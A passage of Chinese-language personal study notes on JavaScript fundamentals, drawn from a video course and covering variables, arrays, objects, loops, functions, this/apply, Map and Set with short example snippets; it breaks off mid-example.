        <content type="html"><![CDATA[<p><strong>笔记内容学自链接视频<code>https://www.bilibili.com/video/BV1JJ41177di</code></strong></p><h1 id="JavaScript概述"><a href="#JavaScript概述" class="headerlink" title="JavaScript概述"></a>JavaScript概述</h1><p><strong><code>javascript</code>遵循<code>ECMAscript</code>标准，简称<code>ES</code>现在已经到了<code>ES6</code>，不过一些浏览器不支持6版本</strong></p><h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Hello World<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"HelloWorld!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//alert弹窗</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong><code>js</code>代码可以写在单独的<code>js</code>文件中引用，也可以直接写<code>HTML</code>文件的<code>script</code>标签内</strong></p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Hello World<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>js/HelloWorld.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"HelloWorld"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>无需类型，<code>javascript</code>中变量都用<code>var</code>定义并用<code>;</code>结尾</p><p><code>js</code>不区分小数和整数，但严格区分大小写</p><p><img src="image-20210829122057137.png" alt="image-20210829122057137"></p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token string">"这是一个变量"</span><span class="token punctuation">;</span><span class="token keyword">var</span> c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"这是一个数组"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// new Array(1,2,3,4,5);</span><span class="token keyword">var</span> d <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">"Atmujie"</span><span class="token punctuation">,</span>    age<span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">,</span>    string<span class="token punctuation">:</span> <span class="token string">"这是一个对象"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210829123654370.png" alt="image-20210829123654370"></p><p><strong>注意：<code>ES6</code>中规定，局部变量使用<code>let</code></strong></p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">.</span><span class="token string">"aaa"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">let</span> c <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">"Atmujie"</span><span class="token punctuation">,</span>    age<span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="条件控制"><a href="#条件控制" class="headerlink" title="条件控制"></a>条件控制</h3><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"瞎写的"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>NaN</code>不与任何数相等，包括它自己</p><p>判断一个值是否为<code>NaN</code>，只能用<code>isNaN(变量)</code>判断</p><p><img src="image-20210829122659696.png" alt="image-20210829122659696"></p><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p><img src="image-20210829122913323.png" alt="image-20210829122913323"></p><h3 id="字符串编写"><a href="#字符串编写" class="headerlink" title="字符串编写"></a>字符串编写</h3><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token string">'use strict'</span><span class="token keyword">let</span> name <span class="token operator">=</span> <span class="token string">"Mujie"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"你好"</span><span class="token operator">+</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`    你好，</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">  // `</span></span><span class="token template-string"><span class="token string">`支持${}输出变量`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210830122452097.png" alt="image-20210830122452097"></p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p><code>js</code>数组可包含任意的类型，并且长度可变</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token string">'use strict'</span><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 更改数组长度为10，无值的位置为空</span>arr<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 更改数组长度为3，超过的部分会丢失</span>arr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 查找3在数组中的位置</span>arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 截取1-5的元素，生成新数组</span>arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 压入一个元素到数组尾部</span>arr<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 弹出/删除数组尾部的元素</span>arr<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 压入元素到数组头部</span>arr<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 从数组头部弹出元素</span>arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 正序排序</span>arr<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 反转数组</span>arr<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 返回一个新数组并添加括号内的元素</span>arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 用-连接数组元素    </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="forEach（）方法"><a href="#forEach（）方法" class="headerlink" title="forEach（）方法"></a><code>forEach（）</code>方法</h4><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">forEach</span><span class="token punctuation">{</span>    <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        arr<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">{</span>           <span class="token keyword">switch</span> <span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">{</span>               <span class="token keyword">case</span> <span class="token number">1</span> <span class="token punctuation">:</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"foreach方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">break</span><span class="token punctuation">;</span>               <span class="token keyword">case</span> <span class="token number">2</span> <span class="token punctuation">:</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"就是将数组中的每个元素依次拿出，交给forEach(方法1)中的方法1执行"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">break</span><span class="token punctuation">;</span>               <span class="token keyword">case</span> <span class="token number">3</span> <span class="token punctuation">:</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"然后根据方法1的处理得出结果"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">break</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">new</span> <span class="token class-name">forEach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210902171546814.png" alt="image-20210902171546814"></p><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">let</span> person <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">"XiaoMing"</span><span class="token punctuation">,</span>    age<span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">,</span>    score<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token keyword">delete</span> person<span class="token punctuation">.</span>name<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 删除name属性 </span>person<span class="token punctuation">.</span>add <span class="token operator">=</span> add<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 增加属性直接写属性名和值即可</span><span class="token string">'age'</span> <span class="token keyword">in</span> person <span class="token comment" spellcheck="true">// 判断age是否在person中</span><span class="token comment" spellcheck="true">// in 可以找到该对象父类的方法</span>preson<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span><span class="token string">'age'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 判断age是否在person中，不包括父类</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h3><p>除数组遍历外其余均与<code>java</code>一致</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token string">'use strict'</span><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">222</span><span class="token punctuation">,</span><span class="token number">134</span><span class="token punctuation">,</span><span class="token number">13211421</span><span class="token punctuation">,</span><span class="token number">54545</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> num <span class="token keyword">in</span> arr<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 使用for...in... 可以遍历数组，num得到的是数组的索引</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// for...in...有一定的问题，应尽量不使用for...in...，</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> num <span class="token keyword">of</span> arr<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 使用for...of... 可以遍历数组，num得到的是数组的值</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210831071914672.png" alt="image-20210831071914672"></p><h3 id="函数与方法"><a href="#函数与方法" class="headerlink" title="函数与方法"></a>函数与方法</h3><p><code>js</code>函数在对象中称为函数，不在对象中称为方法</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token string">'use strict'</span><span class="token keyword">function</span> <span class="token function">abs</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">-</span>x<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//定义方法二</span><span class="token keyword">let</span> abs <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正常来说，方法需要几个参数就只能传入几个参数，但<code>js</code>的方法可以传入任意的参数，方法内部只是按需索取</p><p>所以<code>js</code>规定了<code>arguments</code>关键字    ，该关键字定义了一个数组，表示传入的所有参数</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">let</span> abs <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arguments<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arguments<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210831122039062.png" alt="image-20210831122039062"></p><p>在<code>ES6</code>中，由于<code>arguments</code>获取参数需要写循环过于麻烦，所以引入了<code>rest</code>新特性</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">abs</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token operator">...</span>rest<span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>rest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// rest是一个包括除x之外所有参数的数组</span><span class="token comment" spellcheck="true">// 使用rest需要在定义参数后加上...rest ，例如(x,...rest)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210831123426371.png" alt="image-20210831123426371"></p><h4 id="this指向问题"><a href="#this指向问题" class="headerlink" title="this指向问题"></a><code>this</code>指向问题</h4><p>在一般语言中，<code>this</code>始终指向本类/方法中的属性，<code>javascript</code>也不例外</p><p>不过<code>js</code>自带一个<code>apply</code>方法，可以使方法的<code>this</code>指向其他对象的属性    </p><pre class="line-numbers language-js"><code class="language-js"><span class="token string">'use strict'</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">"Xiaoming"</span><span class="token punctuation">,</span>    abc <span class="token punctuation">:</span> A<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>app<span class="token punctuation">.</span><span class="token function">abc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Xiaoming</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// null</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Xiaoming</span><span class="token comment" spellcheck="true">/*apply(对象,传参[数组类型])*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Map和SET集合"><a href="#Map和SET集合" class="headerlink" title="Map和SET集合"></a><code>Map</code>和<code>SET</code>集合</h3><p>这是<code>es6</code>的新特性</p><h4 id="Map"><a href="#Map" class="headerlink" title="Map"></a><code>Map</code></h4><p><code>Map</code>是一个可以自定义的对象</p><p>最基础的使用可以写为<code>let myMap = new Map( [ [&quot;name&quot;,&quot;XiaoMing&quot;] , [&quot;age&quot;,11] ] );</code></p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">let</span> myMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> keyObj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">let</span> keyFunc <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">let</span> keyString <span class="token operator">=</span> <span class="token string">'a string'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 添加键</span>myMap<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>keyString<span class="token punctuation">,</span> <span class="token string">"和键'a string'关联的值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>myMap<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>keyObj<span class="token punctuation">,</span> <span class="token string">"和键keyObj关联的值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>myMap<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>keyFunc<span class="token punctuation">,</span> <span class="token string">"和键keyFunc关联的值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>myMap<span class="token punctuation">.</span>size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 3</span><span class="token comment" spellcheck="true">// 读取值</span>myMap<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>keyString<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// "和键'a string'关联的值"</span>myMap<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>keyObj<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// "和键keyObj关联的值"</span>myMap<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>keyFunc<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// "和键keyFunc关联的值"</span>myMap<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'a string'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// "和键'a string'关联的值"</span>                         <span class="token comment" spellcheck="true">// 因为keyString === 'a string'</span>myMap<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// undefined, 因为keyObj !== {}</span>myMap<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// undefined, 因为keyFunc !== function () {}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Set"><a href="#Set" class="headerlink" title="Set"></a><code>Set</code></h4><p><code>Set</code>对象是值的集合，可以按照插入的顺序迭代它的元素。 Set中的元素只会<strong>出现一次</strong>，即 Set 中的元素是唯一的。</p><p>即<code>Set</code>的值不可重复，<code>Map</code>的值可重复</p><p>基本用法<code>let mySet = new Set([1,2,4,7,9]);</code></p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">let</span> mySet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>mySet<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Set [ 1 ]</span>mySet<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Set [ 1, 5 ]</span>mySet<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Set [ 1, 5 ]</span>mySet<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"some text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Set [ 1, 5, "some text" ]</span><span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token punctuation">{</span>a<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> b<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">;</span>mySet<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>mySet<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>a<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> b<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// o 